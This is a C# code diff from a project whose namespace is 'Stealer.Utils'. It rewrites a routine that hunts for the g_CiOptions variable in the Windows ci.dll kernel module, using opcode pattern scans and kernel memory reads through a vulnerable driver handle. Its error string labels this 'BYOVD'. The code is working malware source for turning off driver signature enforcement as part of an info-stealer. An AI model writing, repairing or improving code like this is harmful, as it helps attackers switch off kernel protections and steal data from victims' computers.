@@ -410,13 +410,12 @@ namespace Stealer.Utils
                 int sizeOfImage = Marshal.ReadInt32(new IntPtr(ntHeaders.ToInt64() + 0x50));
 
                 if (sizeOfImage <= 0 || sizeOfImage > 10 * 1024 * 1024)
-                    sizeOfImage = 0x100000; // Default 1MB fallback
+                    sizeOfImage = 0x100000;
 
                 byte[] imageCode = new byte[sizeOfImage];
                 Marshal.Copy(userCiBase, imageCode, 0, sizeOfImage);
 
-                // Strategy 1: Scan whole image for mov dword ptr [g_CiOptions], 6
-                // C7 05 XX XX XX XX 06 00 00 00
+                // Pass 1: Direct instruction scan for g_CiOptions = 6 (mov [g_CiOptions], 6)
                 for (int i = 0; i < sizeOfImage - 10; i++)
                 {
                     if (imageCode[i] == 0xC7 && imageCode[i + 1] == 0x05 &&
@@ -437,8 +436,7 @@ namespace Stealer.Utils
                     }
                 }
 
-                // Strategy 2: Scan whole image for cmp dword ptr [g_CiOptions], 6 or 0
-                // 83 3D XX XX XX XX 06 / 00
+                // Pass 2: Direct instruction scan for cmp [g_CiOptions], 6 or 0
                 for (int i = 0; i < sizeOfImage - 7; i++)
                 {
                     if (imageCode[i] == 0x83 && imageCode[i + 1] == 0x3D &&
@@ -458,57 +456,25 @@ namespace Stealer.Utils
                     }
                 }
 
-                // Strategy 3: Scan near exported functions (CiInitialize, CipReportSecurityViolation)
-                string[] exports = new string[] { "CiInitialize", "CiFreePolicyInfo", "CiValidateImageHeader", "CipReportSecurityViolation" };
-                foreach (string exp in exports)
+                // Pass 3: Direct kernel memory range scanning for g_CiOptions == 6
+                // g_CiOptions is located in ci.dll .data section (usually offset 0x30000 - 0x60000)
+                for (long offset = 0x20000; offset < sizeOfImage + 0x10000; offset += 4)
                 {
-                    IntPtr proc = GetProcAddress(userCiBase, exp);
-                    if (proc != IntPtr.Zero)
+                    IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
+                    uint val = ReadKernelMemory32WithHandle(hDev, cand);
+                    if (val == 6)
                     {
-                        long procOffset = proc.ToInt64() - userCiBase.ToInt64();
-                        int searchLen = 0x800;
-                        for (int i = (int)procOffset; i < (int)procOffset + searchLen && i < sizeOfImage - 7; i++)
+                        // Verify adjacent memory structure to avoid false positives
+                        uint prevVal = ReadKernelMemory32WithHandle(hDev, new IntPtr(cand.ToInt64() - 4));
+                        uint nextVal = ReadKernelMemory32WithHandle(hDev, new IntPtr(cand.ToInt64() + 4));
+                        if (prevVal == 0 || prevVal == 1 || nextVal == 0 || nextVal == 1)
                         {
-                            if ((imageCode[i] == 0x89 || imageCode[i] == 0x8B) && ((imageCode[i + 1] & 0xC7) == 0x05 || (imageCode[i + 1] & 0xC7) == 0x0D))
-                            {
-                                int rel = BitConverter.ToInt32(imageCode, i + 2);
-                                IntPtr nextInstr = new IntPtr(userCiBase.ToInt64() + i + 6);
-                                IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
-                                long offset = userTarget.ToInt64() - userCiBase.ToInt64();
-                                IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
-
-                                uint val = ReadKernelMemory32WithHandle(hDev, cand);
-                                if (val == 6 || val == 0x6 || val == 0xE || val == 0x8 || (val & 6) != 0)
-                                {
-                                    return cand;
-                                }
-                            }
+                            return cand;
                         }
                     }
                 }
 
-                // Strategy 4: Fallback scan all relative MOVs in whole image that point to kernel memory returning 6
-                for (int i = 0; i < sizeOfImage - 7; i++)
-                {
-                    if ((imageCode[i] == 0x89 || imageCode[i] == 0x8B) && ((imageCode[i + 1] & 0xC7) == 0x05 || (imageCode[i + 1] & 0xC7) == 0x0D))
-                    {
-                        int rel = BitConverter.ToInt32(imageCode, i + 2);
-                        IntPtr nextInstr = new IntPtr(userCiBase.ToInt64() + i + 6);
-                        IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
-                        long offset = userTarget.ToInt64() - userCiBase.ToInt64();
-                        if (offset > 0 && offset < sizeOfImage + 0x20000)
-                        {
-                            IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
-                            uint val = ReadKernelMemory32WithHandle(hDev, cand);
-                            if (val == 6 || val == 0x6 || val == 0xE || val == 0x8)
-                            {
-                                return cand;
-                            }
-                        }
-                    }
-                }
-
-                errDetail = "BYOVD: All 4 scan strategies found no g_CiOptions in full ci.dll image (size=" + sizeOfImage + ", base=0x" + ciKernelBase.ToString("X") + ")";
+                errDetail = "BYOVD: Direct scans found no g_CiOptions in full ci.dll image (size=" + sizeOfImage + ", base=0x" + ciKernelBase.ToString("X") + ")";
                 return IntPtr.Zero;
             }
             finally
